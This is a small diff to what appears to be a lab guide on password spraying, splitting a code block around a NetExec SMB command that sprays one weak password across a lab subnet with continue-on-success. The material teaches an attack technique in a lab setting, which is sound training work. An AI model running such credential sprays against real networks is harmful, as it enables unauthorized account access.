@@ -43,6 +43,9 @@ These are often overlooked by defenders but easily guessed by attackers.
 Run a password spray using NetExec:
 ```bash
 cd ~/password_spray/
+```
+and then...
+```
 netexec smb 10.10.X.10 -u 'usernames.txt' -p 'L@bl0cal' -d lab.local -t 5 --continue-on-success --dns-tcp --dns-server 10.10.X.10 --log one_for_all
 ```
 > - Sweeps across the subnet using one weak password
